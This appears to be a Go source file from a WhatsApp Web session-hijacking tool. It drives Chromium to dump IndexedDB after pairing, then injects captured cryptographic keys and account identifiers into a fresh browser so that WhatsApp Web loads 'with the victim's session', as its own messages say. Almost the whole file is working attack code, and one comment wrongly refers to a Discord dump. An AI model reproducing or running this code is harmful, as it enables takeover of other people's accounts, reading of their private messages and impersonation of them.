package whatsapp

import (
	"context"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"time"

	"github.com/chromedp/cdproto/indexeddb"
	"github.com/chromedp/chromedp"
)

// ReferenceProfile represents a full IndexedDB dump from a paired WhatsApp Web session.
type ReferenceProfile struct {
	Databases []ReferenceDatabase `json:"databases"`
}

type ReferenceDatabase struct {
	Name    string           `json:"name"`
	Version int64            `json:"version"`
	Stores  []ReferenceStore `json:"stores"`
}

type ReferenceStore struct {
	Name    string        `json:"name"`
	KeyPath string        `json:"key_path"`
	AutoInc bool          `json:"auto_increment"`
	Indexes []string      `json:"indexes"`
	Entries []StoreEntry  `json:"entries"`
}

type StoreEntry struct {
	Key   string          `json:"key"`
	Value json.RawMessage `json:"value"`
}

// DiscoverReferenceProfile opens Chromium, navigates to web.whatsapp.com,
// waits for the user to scan the QR code, then dumps IndexedDB contents.
// Run this ONCE with your own phone to capture the storage schema.
func DiscoverReferenceProfile(outDir string) error {
	if err := os.MkdirAll(outDir, 0755); err != nil {
		return fmt.Errorf("mkdir %s: %w", outDir, err)
	}

	userDir, err := os.MkdirTemp("", "whatsapp-ref-*")
	if err != nil {
		return fmt.Errorf("temp dir: %w", err)
	}
	defer os.RemoveAll(userDir)

	opts := append(chromedp.DefaultExecAllocatorOptions[:],
		chromedp.UserDataDir(userDir),
		chromedp.Flag("disable-extensions", false),
		chromedp.NoFirstRun,
		chromedp.NoDefaultBrowserCheck,
		chromedp.WindowSize(1280, 900),
	)

	allocCtx, allocCancel := chromedp.NewExecAllocator(context.Background(), opts...)
	defer allocCancel()

	ctx, cancel := chromedp.NewContext(allocCtx)
	defer cancel()

	if err := chromedp.Run(ctx, chromedp.Navigate("https://web.whatsapp.com")); err != nil {
		return fmt.Errorf("navigate: %w", err)
	}

	fmt.Println("\n============================================")
	fmt.Println("  WHATSAPP WEB - REFERENCE PAIRING")
	fmt.Println("============================================")
	fmt.Println("  A Chromium window will open with web.whatsapp.com")
	fmt.Println("  1. Scan the QR code with your phone")
	fmt.Println("  2. Wait for WhatsApp Web to load your chats")
	fmt.Println("  3. Come back to this terminal")
	fmt.Println("============================================")

	// Dump pre-pairing state
	preProfile := dumpProfile(ctx)
	if preProfile != nil {
		saveJSON(filepath.Join(outDir, "pre_pairing.json"), preProfile)
	}

	// Wait for pairing (QR code disappears, main UI loads)
	fmt.Println("\n[*] Waiting for pairing (up to 2 minutes)...")
	pairCtx, pairCancel := context.WithTimeout(ctx, 120*time.Second)
	defer pairCancel()

	if err := chromedp.Run(pairCtx,
		chromedp.WaitVisible("#app .two", chromedp.ByQuery),
	); err != nil {
		fmt.Println("[!] Timed out waiting for pairing.")
		fmt.Println("[!] Make sure you scanned the QR code.")
		return nil
	}

	// Wait for IndexedDB to settle
	fmt.Println("[+] Paired! Waiting for IndexedDB to sync...")
	time.Sleep(5 * time.Second)

	// Dump post-pairing state
	postProfile := dumpProfile(ctx)
	if postProfile != nil {
		saveJSON(filepath.Join(outDir, "post_pairing.json"), postProfile)
	}

	fmt.Printf("\n[+] Reference profile saved to %s\n", outDir)
	fmt.Println("[+] You can close the Chromium window now.")
	fmt.Println("\nPress Enter to finish...")
	fmt.Scanln()

	return nil
}

func dumpProfile(ctx context.Context) *ReferenceProfile {
	ctx, cancel := context.WithTimeout(ctx, 15*time.Second)
	defer cancel()

	// Enable IndexedDB
	if err := chromedp.Run(ctx, indexeddb.Enable()); err != nil {
		return nil
	}

	var dbNames *indexeddb.RequestDatabaseNamesReturns
	if err := chromedp.Run(ctx,
		indexeddb.RequestDatabaseNames().Do(&dbNames),
	); err != nil || dbNames == nil || len(dbNames.DatabaseNames) == 0 {
		return nil
	}

	profile := &ReferenceProfile{}

	for _, name := range dbNames.DatabaseNames {
		var dbRet indexeddb.RequestDatabaseReturns
		if err := chromedp.Run(ctx,
			indexeddb.RequestDatabase(name).Do(&dbRet),
		); err != nil || dbRet.DatabaseWithObjectStores == nil {
			continue
		}

		db := dbRet.DatabaseWithObjectStores
		rdb := ReferenceDatabase{
			Name:    name,
			Version: db.Version,
		}

		for _, store := range db.ObjectStores {
			rs := ReferenceStore{
				Name:    store.Name,
				KeyPath: store.KeyPath,
				AutoInc: store.AutoIncrement,
			}
			for _, idx := range store.Indexes {
				rs.Indexes = append(rs.Indexes, idx.Name)
			}

			// Fetch all data from this store
			keyRange := indexeddb.NewKeyRange()
			var cursor *indexeddb.Cursor
			var hasMore bool

			for {
				if err := chromedp.Run(ctx,
					indexeddb.RequestData(name, store.Name, keyRange, 200).Do(&cursor, &hasMore),
				); err != nil {
					break
				}
				if cursor == nil {
					break
				}
				for _, entry := range cursor.ObjectStoreDataEntries {
					var keyStr string
					if entry.Key != nil && entry.Key.Value != nil {
						keyStr = fmt.Sprintf("%v", entry.Key.Value)
					}
					var val json.RawMessage
					if entry.Value != nil && entry.Value.Value != nil {
						val, _ = json.Marshal(entry.Value.Value)
					}
					rs.Entries = append(rs.Entries, StoreEntry{
						Key:   keyStr,
						Value: val,
					})
				}
				if !hasMore || cursor == nil {
					break
				}
			}

			rdb.Stores = append(rdb.Stores, rs)
		}

		profile.Databases = append(profile.Databases, rdb)
	}

	return profile
}

func saveJSON(path string, v interface{}) {
	data, _ := json.MarshalIndent(v, "", "  ")
	os.WriteFile(path, data, 0644)
	fmt.Printf("    Saved: %s\n", filepath.Base(path))
}

// ReplayInBrowser opens Chromium, injects the captured session into
// IndexedDB, and opens web.whatsapp.com with the victim's session.
func ReplayInBrowser(sd *sessionData) error {
	userDir, err := os.MkdirTemp("", "whatsapp-replay-*")
	if err != nil {
		return fmt.Errorf("temp dir: %w", err)
	}
	defer os.RemoveAll(userDir)

	opts := append(chromedp.DefaultExecAllocatorOptions[:],
		chromedp.UserDataDir(userDir),
		chromedp.Flag("disable-extensions", false),
		chromedp.NoFirstRun,
		chromedp.NoDefaultBrowserCheck,
		chromedp.WindowSize(1280, 900),
	)

	allocCtx, allocCancel := chromedp.NewExecAllocator(context.Background(), opts...)
	defer allocCancel()

	ctx, cancel := chromedp.NewContext(allocCtx)
	defer cancel()

	// Navigate to web.whatsapp.com first (so IndexedDB is created with correct origin)
	if err := chromedp.Run(ctx, chromedp.Navigate("https://web.whatsapp.com")); err != nil {
		return fmt.Errorf("navigate: %w", err)
	}

	// Wait for the page to initialize
	time.Sleep(3 * time.Second)

	// Inject session data via JavaScript
	injectJS := buildInjectScript(sd)
	if err := chromedp.Run(ctx, chromedp.Evaluate(injectJS, nil)); err != nil {
		return fmt.Errorf("inject: %w", err)
	}

	fmt.Println("\n[+] Session data injected into IndexedDB")
	fmt.Println("[+] Refreshing page to load with victim's session...")

	// Reload
	if err := chromedp.Run(ctx, chromedp.Reload()); err != nil {
		return fmt.Errorf("reload: %w", err)
	}

	fmt.Println("[+] WhatsApp Web should load with the victim's session.")
	fmt.Println("[+] Keep the browser open. Press Enter in the terminal to disconnect.")
	fmt.Scanln()

	return nil
}

// buildInjectScript creates JavaScript to write session data into IndexedDB.
// NOTE: The exact format depends on what DiscordProfileDump discovers.
// This is a template that will be adjusted after running DiscoverReferenceProfile.
func buildInjectScript(sd *sessionData) string {
	return fmt.Sprintf(`
(function() {
    console.log('[INJECT] Starting IndexedDB injection...');
    var keys = {
        noiseKey: { pub: new Uint8Array(%v), priv: new Uint8Array(%v) },
        identityKey: { pub: new Uint8Array(%v), priv: new Uint8Array(%v) },
        signedPreKey: { keyId: %d, pub: new Uint8Array(%v), priv: new Uint8Array(%v), signature: new Uint8Array(%v) },
        registrationId: %d,
        advSecretKey: new Uint8Array(%v),
        jid: '%s@%s',
        pushName: '%s',
        businessName: '%s',
        platform: '%s'
    };

    var request = indexedDB.open('whatsapp');
    request.onupgradeneeded = function(e) {
        var db = e.target.result;
        if (!db.objectStoreNames.contains('session')) {
            db.createObjectStore('session');
        }
    };
    request.onsuccess = function(e) {
        var db = e.target.result;
        var tx = db.transaction('session', 'readwrite');
        var store = tx.objectStore('session');
        for (var key in keys) {
            store.put(keys[key], key);
        }
        console.log('[INJECT] Session data written successfully');
    };
    request.onerror = function(e) {
        console.log('[INJECT] Error:', e.target.error);
    };
})();
`,
		byteSliceToJS(sd.NoisePub), byteSliceToJS(sd.NoisePriv),
		byteSliceToJS(sd.IdentityPub), byteSliceToJS(sd.IdentityPriv),
		sd.SignedPreKeyID,
		byteSliceToJS(sd.SignedPrePub), byteSliceToJS(sd.SignedPrePriv), byteSliceToJS(sd.SignedPreSig),
		sd.RegistrationID,
		byteSliceToJS(sd.AdvSecretKey),
		sd.JIDUser, sd.JIDServer,
		sd.PushName, sd.BusinessName, sd.Platform,
	)
}

func byteSliceToJS(b []byte) string {
	if len(b) == 0 {
		return "[]"
	}
	s := "["
	for i, v := range b {
		if i > 0 {
			s += ","
		}
		s += fmt.Sprintf("%d", v)
	}
	s += "]"
	return s
}
